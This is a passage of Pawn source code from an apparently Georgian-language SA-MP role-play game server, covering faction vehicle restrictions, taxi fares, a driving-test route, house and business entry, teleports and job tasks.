			else if(GetVehicleModel(vehicleid) == 425 && pData[playerid][pRank] == 5)
			{
				SendClientMessage(playerid,CGRAY,"Es Transporti Xelmisawvdomia Mxolod 5 Rankidan");
				RemovePlayerFromVehicle(playerid);
			}
		}
		else if(vehicleid >= aLSPD[0] && vehicleid <= aLSPD[1])
		{
			if(pData[playerid][pFraction] != 9 || pData[playerid][pSubfraction] < 1)
			{
				SendClientMessage(playerid,CGRAY,"Es Transporti Xelmisawvdomia Mxolod LSPD-Stvis");
				RemovePlayerFromVehicle(playerid);
			}
		}
		else if(vehicleid >= aSFPD[0] && vehicleid <= aSFPD[1])
		{
			if(pData[playerid][pFraction] != 9 || pData[playerid][pSubfraction] < 1)
			{
				SendClientMessage(playerid,CGRAY,"Es Transporti Xelmisawvdomia Mxolod SFPD-Stvis");
				RemovePlayerFromVehicle(playerid);
			}
		}
		else if(vehicleid >= aLVPD[0] && vehicleid <= aLVPD[1])
		{
			if(pData[playerid][pFraction] != 9 || pData[playerid][pSubfraction] < 1)
			{
				SendClientMessage(playerid,CGRAY,"Es Transporti Xelmisawvdomia Mxolod LVPD-Stvis");
				RemovePlayerFromVehicle(playerid);
			}
		}
		else if(vehicleid >= aNews[0] && vehicleid <= aNews[1])
		{
			if(pData[playerid][pFraction] != 10)
			{
				SendClientMessage(playerid,CGRAY,"Es Transporti Xelmisawvdomia Mxolod News Network-Stvis");
				RemovePlayerFromVehicle(playerid);
			}
		}
		else if(vehicleid >= aFbi[0] && vehicleid <= aFbi[1])
		{
			if(pData[playerid][pFraction] != 11)
			{
				SendClientMessage(playerid,CGRAY,"Es Transporti Xelmisawvdomia Mxolod FBI-Stvis");
				RemovePlayerFromVehicle(playerid);
			}
		}
		else if(vehicleid >= aYakuza[0] && vehicleid <= aYakuza[1])
		{
		    if(pData[playerid][pFraction] != 12)
			{
				SendClientMessage(playerid,CGRAY,"Es Transporti Xelmisawvdomia Mxolod Yakuza-Stvis");
				RemovePlayerFromVehicle(playerid);
			}
		}
		else if(vehicleid >= aMexico[0] && vehicleid <= aMexico[1])
		{
		    if(pData[playerid][pFraction] != 13)
			{
				SendClientMessage(playerid,CGRAY,"Es Transporti Xelmisawvdomia Mxolod LCN-Stvis");
				RemovePlayerFromVehicle(playerid);
			}
		}
		else if(vehicleid >= aColomb[0] && vehicleid <= aColomb[1])
		{
		    if(pData[playerid][pFraction] != 14)
			{
				SendClientMessage(playerid,CGRAY,"Es Transporti Xelmisawvdomia Mxolod RM-Stvis");
				RemovePlayerFromVehicle(playerid);
			}
		}
		else if(vehicleid >= aMer[0] && vehicleid <= aMer[1])
		{
		    if(pData[playerid][pFraction] != 15)
			{
				SendClientMessage(playerid,CGRAY,"Es Transporti Xelmisawvdomia Mxolod Meriistvis");
				RemovePlayerFromVehicle(playerid);
			}
		}
		else
		{
			for(new i;i<5;i++)
			{
				for(new j;j<5;j++)
				{
					if(vehicleid == aGang[i][j] && pData[playerid][pFraction] != i+3)
					{
						format(mes,sizeof(mes),"Es Transporti Xelmisawvdomia Mxolod Wevrebistvis: %s",gFractionName[i+2]);
						SendClientMessage(playerid,CGRAY,mes);
						RemovePlayerFromVehicle(playerid);
					}
				}
			}
		}
		if(gVehicleGun[vehicleid][vGunLoading] || gVehicleGun[vehicleid][vGunUnloading])
		{
			if(vehicleid >= aArmy1[0] && vehicleid <= aArmy2[1] && pData[playerid][pFraction] != 8) return true;
			if(vehicleid >= aLSPD[0] && vehicleid <= aLVPD[1] && pData[playerid][pFraction] != 9) return true;
			ShowPlayerDialog(playerid,dStopLoad,0,"Martva","{"#cWHITE"}Gsurt Shewyvitot Chartvirtva?","YES","NO");
		}
		SetPVarInt(playerid, "vehid", GetPlayerVehicleID(playerid));
		if(vehicleid) gVehicleDriver[vehicleid-1] = playerid;
	}
	if(newstate == PLAYER_STATE_PASSENGER)
	{
		new vehicleid = GetPlayerVehicleID(playerid);
		SetPlayerArmedWeapon(playerid,29);
		if(vehicleid >= aTaxi[0] && vehicleid <= aTaxi[1] && gVehicleDriver[vehicleid-1] != INVALID_PLAYER_ID) //Пассажир сел в такси
		{
			new driverid = gVehicleDriver[vehicleid-1];
			if(pTemp[driverid][pTaxiID] != vehicleid || !pTemp[driverid][pTaxiPrice]) return true;
			if(pTemp[driverid][pTaxiPass] == INVALID_PLAYER_ID)
			{
				if(GetPlayerMoneyEx(playerid) < pTemp[driverid][pTaxiPrice])
				{
					SendClientMessage(playerid,CRED,"Arasakmarisi Tanxa");
					return RemovePlayerFromVehicle(playerid);
				}
				pTemp[driverid][pTaxiPass] = playerid;
				format(mes,sizeof(mes),"~g~%d$",pTemp[driverid][pTaxiPrice]);
				GameTextForPlayer(playerid,mes,300,4);
				GameTextForPlayer(driverid,mes,300,4);
				TransferMoney(playerid,driverid,pTemp[driverid][pTaxiPrice]);
			}
			else
			{
				if(pTemp[driverid][pTaxiTurn][0] == INVALID_PLAYER_ID) pTemp[driverid][pTaxiTurn][0] = playerid;
				else if(pTemp[driverid][pTaxiTurn][1] == INVALID_PLAYER_ID) pTemp[driverid][pTaxiTurn][1] = playerid;
				else
				{
					if(!IsPlayerConnected(pTemp[driverid][pTaxiTurn][0]) || GetPlayerVehicleID(pTemp[driverid][pTaxiTurn][0]) != vehicleid)
					{
						if(pTemp[driverid][pTaxiTurn][1] != INVALID_PLAYER_ID)
						{
							pTemp[driverid][pTaxiTurn][0] = pTemp[driverid][pTaxiTurn][1];
							pTemp[driverid][pTaxiTurn][1] = playerid;
						}
						else pTemp[driverid][pTaxiTurn][0] = playerid;
					}
					else if(!IsPlayerConnected(pTemp[driverid][pTaxiTurn][1]) || GetPlayerVehicleID(pTemp[driverid][pTaxiTurn][1]) != vehicleid)
					{
						pTemp[driverid][pTaxiTurn][1] = playerid;
					}
					else
					{
						SendClientMessage(playerid,CGRAY,"Shecdoma. Iqiravet Taxi Tavidan");
						RemovePlayerFromVehicle(playerid);
					}
				}
			}
		}
	}
	if(oldstate == PLAYER_STATE_DRIVER)
	{
		HideCarInfo(playerid);
		new id = GetPVarInt(playerid, "vehid");
		if(id)
		{
			GetVehiclePos(id, gVehicles[id - 1][vX], gVehicles[id - 1][vY], gVehicles[id - 1][vZ]);
			GetVehicleZAngle(id, gVehicles[id - 1][vA]);
			gVehicleDriver[id-1] = INVALID_VEHICLE_ID;
			SetPVarInt(playerid, "lastveh", id);
		}
	}
	return true;
}

public OnPlayerEnterCheckpoint(playerid)
{
	if(GetPVarInt(playerid,"GPS") == 1)
	{
		DisablePlayerCheckpoint(playerid);
		RemovePlayerAttachedObject(playerid, 5);
		SetPVarInt(playerid,"GPS",0);
		PlayerPlaySound(playerid,1056,0.0,0.0,0.0);
	}
	return true;
}

public OnPlayerLeaveCheckpoint(playerid)
{
	return true;
}

public OnPlayerEnterDynamicCP(playerid,checkpointid)
{
 	if(PlayerTir[playerid] == -1)
 	{
		for(new i;i < sizeof(TirInfo);i ++)
		{
		    if(checkpointid == Tir_CP[i]) return ShowTirTutDialog(playerid, i);
		}
	}
	return true;
}

public OnPlayerEnterRaceCheckpoint(playerid)
{
 	if(GetPVarInt(playerid, "testcar1") == 1)
 	{
 	    switch(GetPVarInt(playerid, "testcar2"))
 	    {
 	        case CHECKPOINT_1:
 	        {
 	            SetPlayerRaceCheckpoint(playerid,0,630.0361,-1419.9673,13.2631,-2021.2046,-72.2330,34.9150,5.0);
 	            SetPVarInt(playerid,"testcar2",CHECKPOINT_2);
 	        }
 	        case CHECKPOINT_2:
 	        {
 	            SetPlayerRaceCheckpoint(playerid,0,541.8522,-1405.0732,15.2963,-2021.2046,-72.2330,34.9150,5.0);
 	            SetPVarInt(playerid,"testcar2",CHECKPOINT_3);
 	        }
 	        case CHECKPOINT_3:
 	        {
 	            SetPlayerRaceCheckpoint(playerid,0,514.3223,-1356.1339,15.6789,-2021.2046,-72.2330,34.9150,5.0);
 	            SetPVarInt(playerid,"testcar2",CHECKPOINT_4);
 	        }
 	        case CHECKPOINT_4:
 	        {
 	            SetPlayerRaceCheckpoint(playerid,0,603.8188,-1226.9661,17.7042,-2021.2046,-72.2330,34.9150,5.0);
 	            SetPVarInt(playerid,"testcar2",CHECKPOINT_5);
 	        }
 	        case CHECKPOINT_5:
 	        {
 	            SetPlayerRaceCheckpoint(playerid,0,625.3459,-1306.1239,13.9394,-2021.2046,-72.2330,34.9150,5.0);
 	            SetPVarInt(playerid,"testcar2",CHECKPOINT_6);
 	        }
 	        case CHECKPOINT_6:
 	        {
 	            SetPlayerRaceCheckpoint(playerid,0,393.0649,-1407.1826,33.7762,-2021.2046,-72.2330,34.9150,5.0);
 	            SetPVarInt(playerid,"testcar2",CHECKPOINT_7);
 	        }
 	        case CHECKPOINT_7:
 	        {
 	            SetPlayerRaceCheckpoint(playerid,0,294.8964,-1486.6920,32.3577,-2021.2046,-72.2330,34.9150,5.0);
 	            SetPVarInt(playerid,"testcar2",CHECKPOINT_8);
 	        }
 	        case CHECKPOINT_8:
 	        {
 	            SetPlayerRaceCheckpoint(playerid,0,198.0048,-1521.2747,13.2047,-2021.2046,-72.2330,34.9150,5.0);
 	            SetPVarInt(playerid,"testcar2",CHECKPOINT_9);
 	        }
 	        case CHECKPOINT_9:
 	        {
 	            SetPlayerRaceCheckpoint(playerid,0,164.3801,-1553.4456,11.2968,-2021.2046,-72.2330,34.9150,5.0);
 	            SetPVarInt(playerid,"testcar2",CHECKPOINT_10);
 	        }
 	        case CHECKPOINT_10:
 	        {
 	            SetPlayerRaceCheckpoint(playerid,0,456.5399,-1723.4510,10.0539,-2021.2046,-72.2330,34.9150,5.0);
 	            SetPVarInt(playerid,"testcar2",CHECKPOINT_11);
 	        }
 	        case CHECKPOINT_11:
 	        {
 	            SetPlayerRaceCheckpoint(playerid,0,636.4731,-1717.7006,13.7401,-2021.2046,-72.2330,34.9150,5.0);
 	            SetPVarInt(playerid,"testcar2",CHECKPOINT_12);
 	        }
 	        case CHECKPOINT_12:
 	        {
 	            SetPlayerRaceCheckpoint(playerid,0,600.7475,-1510.1954,14.7460,-2021.2046,-72.2330,34.9150,5.0);
 	            SetPVarInt(playerid,"testcar2",CHECKPOINT_13);
 	        }
 	        case CHECKPOINT_13:
 	        {
 	            SendClientMessage(playerid, CGREEN, "Tqven Warmatebit Gaiaret Gamocdis Praqtikuli Nawili.");
				pData[playerid][pLicenses][LIC_DRIVING] = 1;
				UpdatePlayerData(playerid,"licDrive",1);
				if(IsPlayerInAnyVehicle(playerid))
				{
				    RemovePlayerFromVehicle(playerid);
					SetVehicleToRespawn(GetPlayerVehicleID(playerid));
				}
				TransferMoney(playerid,-1,150);
				SetPVarInt(playerid,"testcar2",0);
				SetPVarInt(playerid,"testcar1",0);
				DisablePlayerCheckpoint(playerid);
 	        }
 	    }
 	}
	return true;
}

public OnPlayerLeaveRaceCheckpoint(playerid)
{
	return true;
}
stock SpeedFVehicle(playerid)
{
	new Float:ST[4];
	if(IsPlayerInAnyVehicle(playerid))
	GetVehicleVelocity(GetPlayerVehicleID(playerid),ST[0],ST[1],ST[2]);
	else GetPlayerVelocity(playerid,ST[0],ST[1],ST[2]);
	ST[3] = floatsqroot(floatpower(floatabs(ST[0]), 2.0) + floatpower(floatabs(ST[1]), 2.0) + floatpower(floatabs(ST[2]), 2.0)) * 100.3;
	return floatround(ST[3]);
}
public OnPlayerEnterDynamicArea(playerid, areaid)
{
    new pstate = GetPlayerState(playerid);
	if(areaid >= gHouseArea[0] && areaid <= gHouseArea[gHouseCount-1])
	{
		if(GetPVarInt(playerid,"JustTP") == 1)
		{
			SetPVarInt(playerid,"JustTP",0);
			return true;
		}
		new houseid=areaid - gHouseArea[0];
		if(houseid == -1) return true;
		pTemp[playerid][pSelectedHouseID] = houseid;
		new classname[20],Float:x, Float:y, Float:z, pos[15], mes2[200];
		GetPlayerPos(playerid,x,y,z);
		if(x < 0) strcat(pos,"San Fiero");
		else if(y > 100.0) strcat(pos,"Las Venturas");
		else strcat(pos,"Los Santos");
		switch(gHouses[houseid][houseClass])
		{
			case 0:classname = "Ekonomi";
			case 1:classname = "Sashualo";
			case 2:classname = "Elituri";
			case 3:classname = "Agaraki";
			default: classname = "Ucnobia";
		}
		if(!gHouses[houseid][houseOwner])
		{
			format(mes2,sizeof(mes2),"{FFFFFF}Saxlis Fasi: {2D6323}%d$\n{FFFFFF}Saxlis Klasi: %s\n\n{FFFFFF}Misamarti: {628A89}Q. %s, %s, Saxli №%d",gHouses[houseid][housePrice],classname,pos,GetHouseZone(houseid),gHouses[houseid][houseID]);
			ShowPlayerDialog(playerid,dHouseInfo,0,"{C79200}Saxli: {1B750B}Iyideba",mes2,"Yidva","Daxurva");
		}
		else
		{
			format(mes2,sizeof(mes2),"{FFFFFF}Mflobeli: {CFCF63}%s\n{FFFFFF}Saxlis Fasi: {2D6323}%d$\n{FFFFFF}Saxlis Klasi: %s\n\n{FFFFFF}Misamarti: {628A89}Q.%s, %s, Saxli №%d",gHouses[houseid][houseOwner],gHouses[houseid][housePrice],classname,pos,GetHouseZone(houseid),gHouses[houseid][houseID]);
			ShowPlayerDialog(playerid,dHouseInfo,0,"{C79200}Saxli: {BD0016}Gayidulia",mes2,"Shesvla","Daxurva");
		}
	}
	if(areaid >= gBusinessArea[0] && areaid <= gBusinessArea[gBusinessCount - 1])
	{
		if(GetPVarInt(playerid,"JustTP") == 1)
		{
			SetPVarInt(playerid,"JustTP",0);
			return true;
		}
		new businessid= areaid - gBusinessArea[0];
		new mes2[128];
		if(businessid < 0) return SendClientMessage(playerid,CGRAY,"Shecdoma (#100)");
		if(!gBusiness[businessid][busiStatus]) return true;
		pTemp[playerid][pSelectedBusinessID] = businessid;
		if(!gBusiness[businessid][busiOwnerID])
		{
			format(mes2,sizeof(mes2),"{"#cWHITE"}Es Biznesi Iyideba Fasad: {"#cRED"}$%d.",gBusiness[businessid][busiSellPrice]);
			ShowPlayerDialog(playerid,dBuyBusiness1,0,"Bizness",mes2,"Yidva","Daxurva");
		}
		else
		{
			new bint = gBusiness[businessid][busiBint]-1;
			if(bint < 0 || bint >= BINT_COUNT) return SendClientMessage(playerid,CGRAY,"Shecdoma (#99)");
			SetPVarInt(playerid,"JustTP",1);
			SetPlayerInterior(playerid,gBints[bint][bintInterior]);
			SetPlayerVirtualWorld(playerid,businessid+1);
			SetPlayerPos(playerid,gBints[bint][bintX],gBints[bint][bintY],gBints[bint][bintZ]);
			SetPlayerFacingAngle(playerid,gBints[bint][bintR]);
			if(bint == 21)
			{
				TogglePlayerControllable(playerid,0);
				SetTimerEx("Unfreez",2000,false,"i",playerid);
			}
		}
	}
	if(areaid >= gBintEnterArea[0] && areaid <= gBintEnterArea[BINT_COUNT-1])
	{
		if(GetPVarInt(playerid,"JustTP") == 1)
		{
			SetPVarInt(playerid,"JustTP",0);
			return true;
		}
		new id = pTemp[playerid][pSelectedBusinessID];
		if(id < 0) return true;
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerInterior(playerid,0);
		SetPVarInt(playerid,"JustTP",1);
		SetPlayerPos(playerid,gBusiness[id][busiX],gBusiness[id][busiY],gBusiness[id][busiZ]);
		SetPlayerFacingAngle(playerid,gBusiness[id][busiR]);
	}
	if(areaid >= gBintBuyArea[0] && areaid <= gBintBuyArea[BINT_COUNT-1])
	{
		new id = pTemp[playerid][pSelectedBusinessID];
		if(id < 0) return true;
		new products = gBusiness[id][busiProduct];
		if(!products) return SendClientMessage(playerid,CGRAY,"Samwuxarod, Produqti Agar Aris");
		new type = gBusiness[id][busiType];
		switch(type)
		{
			case 1: {}
			case 2: ShowPlayerEateryTD(playerid, id);
			case 3: //24/7
			{
			    new mes2[400];
				for(new i;i<SHOP_OBJECTS;i++)
				{
					format(mes2,sizeof(mes2),"%s{ffffff}%s  | {3B8212}%d$\n",mes2,gShopObject[i],gShopProduct[i]*gBusiness[id][busiPrice]);
				}
				ShowPlayerDialog(playerid,dShop,2,"{"#cGREEN"}Magazia 24/7: {ffffff}Produqti",mes2,"Yidva","Daxurva");
			}
			case 4..5: ShowPlayerBarTD(playerid, id);
			case 7: {
			    if(GetPVarInt(playerid,"JustTP") == 1) {
			        SetPVarInt(playerid,"JustTP",0);
				}
				else {
					if(GetPVarInt(playerid,"ChangingSkin") == 0) {
						SetPVarInt(playerid,"ChangingSkin",1);
						new Float: pos[4];
						GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
						GetPlayerFacingAngle(playerid, pos[3]);
						SetPVarFloat(playerid, "posx", pos[0]);
						SetPVarFloat(playerid, "posy", pos[1]);
						SetPVarFloat(playerid, "posz", pos[2]);
						SetPVarFloat(playerid, "posa", pos[3]);
						SetPVarInt(playerid, "interior", GetPlayerInterior(playerid));
						SetPVarInt(playerid, "vw", GetPlayerVirtualWorld(playerid));
						TogglePlayerControllable(playerid, 0);
						SetPlayerInterior(playerid, 14);
						SetPlayerVirtualWorld(playerid, playerid + 1);
						SetPlayerPos(playerid, 258.7497, -41.3828, 1002.0234);
						SetPlayerFacingAngle(playerid, 70.0);
						SetPlayerCameraPos(playerid, 258.7498 + (2.5 * floatsin(-70.0, degrees)), -41.3828 + (2.5 * floatcos(-70.0, degrees)), 1002.5);
						SetPlayerCameraLookAt(playerid, 258.7497, -41.3828, 1002.0234);
						new class;
						switch(gBusiness[id][busiBint]) {
						    case 5: class = SKIN_CLASS_ECONOM;
						    case 6: class = SKIN_CLASS_EXPENSIVE;
						    case 7: class = SKIN_CLASS_ECONOM;
						    case 8: class = SKIN_CLASS_MEDIUM;
						    case 9: class = SKIN_CLASS_EXPENSIVE;
						    case 23: class = SKIN_CLASS_ECONOM;
						}
						SetPVarInt(playerid, "clothes_class", class);
						SetPVarInt(playerid, "clothes_sel", 0);
						SetPVarInt(playerid, "curskin", GetPlayerSkin(playerid));
						ShowPlayerClothesTD(playerid);
					}
				}
			}
			case 8: return true;
		}
	}
 	if(areaid == gAreas[arSellCar]) ShowPlayerDialog(playerid,dBuyCarSalon,0,"{"#cGREEN"}Avtosaloni","{ffffff}Gsurt Naxot Avtomobilebis Sia?","YES","NO");
	if(areaid == gAreas[arPodval] && GetPVarInt(playerid,"podvala") == 2)
	{
	    SetPlayerAttachedObject(playerid,0,18644,5,0.078999,0.042999,-0.012999,-3.299995,0.000000,0.000000);
		SetPlayerAttachedObject(playerid,1,18635,6);
	    SetPVarInt(playerid,"podvala",1);
	    SendClientMessage(playerid,CWHITE,"Axla Dabrundit Dacvis Magidastan.");
	}
	if(areaid == gAreas[arPodval1] && GetPVarInt(playerid,"podvala") == 1)
 	{
 	    SetPVarInt(playerid,"podvala",0);
 	    new objectid = CreateDynamicObject(363,1387.5600586,-25.9529991,1000.9479980,270.0000000,90.0000000,0.0000000);
		SetPVarInt(playerid,"pgunobject",objectid);
		SetPlayerPos(playerid,1387.5725,-25.3795,1000.9229);
		SetPlayerFacingAngle(playerid, 181.7116);
 	    ClearAnimations(playerid);
 	    ApplyAnimation(playerid,"CAR_CHAT","CAR_Sc4_BL",4.0,1,1,1,0,20000,0);
 	    SetTimerEx("BombaOK",20000,false,"i",playerid);
	}
	if(areaid >= gTeleportAreas[0][0] && areaid <= gTeleportAreas[TELEPORTS_COUNT-1][1] && pstate == PLAYER_STATE_ONFOOT)
	{
		if(GetPVarInt(playerid,"JustTP") == 1)
		{
			SetPVarInt(playerid,"JustTP",0);
			return true;
		}
		new id,subid;
		for(new i;i<TELEPORTS_COUNT;i++)
		{
			if(areaid == gTeleportAreas[i][0]) {id = i; subid = 1;}
			if(areaid == gTeleportAreas[i][1]) {id = i; subid = 0;}
		}
		if(id == 1 && GetPVarInt(playerid,"ChangingSkin") == 1)
		{
			SetPVarInt(playerid,"ChangingSkin",0);
			SetPlayerSkin(playerid,pData[playerid][pSkin]);
		}
		if(id == 3)
		{
			if(pData[playerid][pFraction] != 1) return SendClientMessage(playerid,CGRAY,"Karebi Daketilia");
		}
		if((id == 4 || id == 5 || id == 6) && subid == 0)
		{
			if(pData[playerid][pHealth] < 0.0) return SendClientMessage(playerid,CGRAY,"Вы не можете выйти из больницы, пока не вылечетесь");
			SetPVarInt(playerid,"InHospital",0);
			pData[playerid][pBolnica] = 0;
			UpdatePlayerData(playerid,"Bolnica",pData[playerid][pBolnica]);
		}
		if((id == 4 || id == 5 || id == 6) && subid == 1) SetPVarInt(playerid,"InHospital",1);
		if(id == 9 || id == 10)
		{
			if(pData[playerid][pFraction] != 8) return SendClientMessage(playerid,CGRAY,"Дверь заперта");
		}
		if(id == 27) if(!IsAMer(playerid)) return true;
		//if(id == 40) if(pData[playerid][pJail]) return true;
		//if(id == 41 && subid == 0) if(!IsACop(playerid)) return true;
		SetPVarInt(playerid,"JustTP",1);
		SetPlayerVirtualWorld(playerid,gTeleportData[id][subid][0]);
		SetPlayerInterior(playerid,gTeleportData[id][subid][1]);
		SetPlayerPos(playerid,gTeleports[id][subid][0],gTeleports[id][subid][1],gTeleports[id][subid][2],0);
		SetPlayerFacingAngle(playerid,gTeleports[id][subid][3]);
		TogglePlayerControllable(playerid,0);
		SetTimerEx("Unfreez",2000,false,"i",playerid);
		SetCameraBehindPlayer(playerid);
	}
	if(areaid == gAreas[arZavodTS] && GetPVarInt(playerid,"kida") == 2)
	{
	    ApplyAnimation(playerid,"BOMBER","BOM_Plant",1.0,1,0,0,0,20000,0);
	    GameTextForPlayer(playerid, "~y~Daicadet 20 Wami", 5000, 1);
	    SetPVarInt(playerid,"kida",3);
		SetTimerEx("TakeTSZAVOD",20000,false,"i",playerid);
	}
	if(areaid == gAreas[arZavod] && GetPVarInt(playerid,"kida") == 2)
	{
		SetPVarInt(playerid,"gunamount",1);
		SendClientMessage(playerid,CWHITE,"Вы взяли рельсу. Следуйте дальше.");
		ClearAnimations(playerid);
		ApplyAnimation(playerid,"CARRY","crry_prtial",4.0,1,1,1,1,1,1);
		SetPlayerAttachedObject(playerid,0,1136,5,0.0,0.10,-0.2, -80.0,0.0,0.0);
		SetPVarInt(playerid,"kida",7);

		new id = RandomEx(0,3);
		SetPlayerCheckpoint(playerid,gZavodCPs[id][0],gZavodCPs[id][1],gZavodCPs[id][2],1.0);
		SetPVarInt(playerid,"loadid",id);
	}
	if(GetPVarInt(playerid,"kida") == 7 && GetPVarInt(playerid,"Work") == 4)
	{
		if((areaid == gAreas[arZavodLoad1] && GetPVarInt(playerid,"loadid") == 0) ||
		(areaid == gAreas[arZavodLoad2] && GetPVarInt(playerid,"loadid") == 1) ||
		(areaid == gAreas[arZavodLoad3] && GetPVarInt(playerid,"loadid") == 2) &&
		pstate == PLAYER_STATE_ONFOOT)
		{
		    SetPVarInt(playerid,"kida",2);
		    RemovePlayerAttachedObject(playerid,0);
			ClearAnimations(playerid);
			ApplyAnimation(playerid,"CAR_CHAT","CAR_Sc4_BL",4.0,1,1,1,0,12000,0);
			SetPlayerAttachedObject(playerid,0,18644,5,0.078999,0.042999,-0.012999,-3.299995,0.000000,0.000000);
			SetPlayerAttachedObject(playerid,1,18635,6);
			SetTimerEx("GunReady",12000,false,"i",playerid);
		}
	}
	//////
	if(areaid == gAreas[arWoodUnload] && GetPVarInt(playerid,"Work") == 3 && GetPVarInt(playerid,"gunamount") == 2)
	{
		if(GetPVarInt(playerid,"pOff9") > gettime()) SendClientMessage(playerid, 0xB85A1CFF, "Tqven Gaikiket Chetis Gamoyenebistvis. (#0040)"), NewKick(playerid);
		pTemp[playerid][pWorkSalary] += 120;
		format(mes,sizeof(mes),"Detalebi Sheifuta. Tqveni Xelpasi {"#cGREEN"}+120$ {ffffff}Sul Gamomushavebuli: {"#cGREEN"}%d$",pTemp[playerid][pWorkSalary]);
		SendClientMessage(playerid,CWHITE,mes);
		RemovePlayerAttachedObject(playerid,0);
		RemovePlayerAttachedObject(playerid,1);
		ApplyAnimation(playerid,"CARRY","putdwn105",5.0,0,0,0,0,1);
		SetPVarInt(playerid,"kida",2);
		SetPlayerCheckpoint(playerid,62.3760,-274.5660,954.9484,2.0);
		SetPVarInt(playerid,"gunamount",1);
		SetPVarInt(playerid,"pOff7",1);
		SetPVarInt(playerid,"pOff9",gettime()+22);

		new listitems[] = "1. Gamdzleoba (Stamina)\n2. Dzala (Power)";
		ShowPlayerDialog(playerid, dRabot, DIALOG_STYLE_LIST, "Gaumjobeseba", listitems, "Archeva", "Daxurva");
	}
	if(areaid == gAreas[arZavodSklad] && GetPVarInt(playerid,"Work") == 4 && GetPVarInt(playerid,"gunamount") == 2)
	{
	    if(GetPVarInt(playerid,"pOff9") > gettime()) SendClientMessage(playerid, 0xB85A1CFF, "Tqven Gaikiket Chetis Gamoyenebistvis. (#0040)"), NewKick(playerid);
		ApplyAnimation(playerid,"CARRY","putdwn",4.0,0,1,1,0,0,1);
		pTemp[playerid][pWorkSalary] += 80;
		format(mes,sizeof(mes),"Relsebi Damagrda. Tqveni Xelpasi {"#cGREEN"}+80$ {ffffff}Sul Gamomushavebuli: {"#cGREEN"}%d$",pTemp[playerid][pWorkSalary]);
		SendClientMessage(playerid,CWHITE,mes);
		RemovePlayerAttachedObject(playerid,0);
		DeletePVar(playerid,"gunamount");
		SetPVarInt(playerid,"pOff7",1);
		SetPVarInt(playerid,"pOff9",gettime()+19);
		SetPVarInt(playerid,"kida",2);
		SetPlayerCheckpoint(playerid,2154.7952,-1972.4408,13.6738,1.0);

		new listitems[] = "1. Gamdzleoba (Stamina)\n2. Dzala (Power)";
		ShowPlayerDialog(playerid, dRabot, DIALOG_STYLE_LIST, "Gaumjobeseba", listitems, "Archeva", "Daxurva");
	}
	if(areaid == gAreas[arSelo] && pstate == PLAYER_STATE_ONFOOT)
	{
		if(GetPVarInt(playerid,"Work") == 0) ShowPlayerDialog(playerid,dSelowork,0,"Mogesalmebit","\n  {"#cWHITE"}Chven Gtavazobt Samushaos {"#cLIGHTBLUE"}Mkeravi.\n{"#cYELLOW"}Tanaxma Xart?","YES","NO");
		else if(GetPVarInt(playerid,"Work") == 5) ShowPlayerDialog(playerid,dSelowork,0,"Samushaos Dasruleba.","Gsurt Samushaos Dasruleba Da Fulis Ageba?","YES","NO");
	}
	if(areaid == gAreas[arCoalman] && pstate == PLAYER_STATE_ONFOOT)
	{
		if(GetPVarInt(playerid,"Work") == 0) ShowPlayerDialog(playerid,dCoalwork,0,"Mogesalmebit","\n  {"#cWHITE"}Chven Gtavazobt Samushaos {"#cLIGHTBLUE"}Mshenebeli.\n{"#cYELLOW"}Tanaxma Xart?","YES","NO");
		else if(GetPVarInt(playerid,"Work") == 2) ShowPlayerDialog(playerid,dCoalwork,0,"Samushaos Dasruleba.","Gsurt Samushaos Dasruleba Da Fulis Ageba?","YES","NO");
	}
	if(areaid == gAreas[arWood] && pstate == PLAYER_STATE_ONFOOT)
	{
		if(GetPVarInt(playerid,"Work") == 0) ShowPlayerDialog(playerid,dWoodwork,0,"Mogesalmebit","\n  {"#cWHITE"}Chven Gtavazobt Samushaos {"#cLIGHTBLUE"}Avtonawilebi.\n{"#cYELLOW"}Tanaxma Xart?","YES","NO");
		else if(GetPVarInt(playerid,"Work") == 3) ShowPlayerDialog(playerid,dWoodwork,0,"Samushaos Dasruleba.","Gsurt Samushaos Dasruleba Da Fulis Ageba?","YES","NO");
	}
	if(areaid == gAreas[arSeloLoad9] && GetPVarInt(playerid,"woodamount"))
 	{
 	    if(GetPVarInt(playerid,"Work") == 5)
 	    {
 	        if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, CGRAY, "Gadmodit Manqanidan.");
 	        if(GetPVarInt(playerid,"pOff9") > gettime()) SendClientMessage(playerid, 0xB85A1CFF, "Tqven Gaikiket Chetis Gamoyenebistvis. (#0040)"), NewKick(playerid);
 	        new amount = GetPVarInt(playerid,"woodamount");
	 	    DeletePVar(playerid,"woodamount");
	 	    new salary = amount;
	 	    pTemp[playerid][pWorkSalary] += salary;
			format(mes,sizeof(mes),"Produqti Gadmoitvirta. +%d$ Tqveni Xelpasi. Sul Gamomushavebuli: %d$",salary,pTemp[playerid][pWorkSalary]);
			SendClientMessage(playerid,CWHITE,mes);
			RemovePlayerAttachedObject(playerid,0);
			RemovePlayerAttachedObject(playerid,1);
			ApplyAnimation(playerid,"CARRY","putdwn105",5.0,0,0,0,0,1);
			new idf = RandomEx(0,7);
			SetPlayerAttachedObject(playerid,1,3026,1,-0.176000, -0.066000, 0.0000,0.0000, 0.0000, 0.0000, 1.07600, 1.079999, 1.029000);
   			SetPlayerCheckpoint(playerid,gSeloCP[idf][0],gSeloCP[idf][1],gSeloCP[idf][2],1.2);
      		SetPVarInt(playerid,"loadid",idf);
			SetPVarInt(playerid,"pOff7",1);
			SetPVarInt(playerid,"pOff9",gettime()+32);

			new listitems[] = "1. Gamdzleoba (Stamina)\n2. Dzala (Power)";
			ShowPlayerDialog(playerid, dRabot, DIALOG_STYLE_LIST, "Gaumjobeseba", listitems, "Archeva", "Daxurva");
 	    }
	}
	if((areaid == gAreas[arWoodLoad1] && GetPVarInt(playerid,"loadid") == 0) ||
	(areaid == gAreas[arWoodLoad2] && GetPVarInt(playerid,"loadid") == 1) ||
	(areaid == gAreas[arWoodLoad3] && GetPVarInt(playerid,"loadid") == 2) ||
	(areaid == gAreas[arWoodLoad4] && GetPVarInt(playerid,"loadid") == 3) ||
	(areaid == gAreas[arWoodLoad5] && GetPVarInt(playerid,"loadid") == 4) ||
	(areaid == gAreas[arWoodLoad6] && GetPVarInt(playerid,"loadid") == 5) ||
	(areaid == gAreas[arWoodLoad7] && GetPVarInt(playerid,"loadid") == 6) &&
	pstate == PLAYER_STATE_ONFOOT)
	{
		if(GetPVarInt(playerid,"Work") == 3 && GetPVarInt(playerid,"woodamount") == 4)
		{
			SetPVarInt(playerid,"kida",2);
		    RemovePlayerAttachedObject(playerid,0);
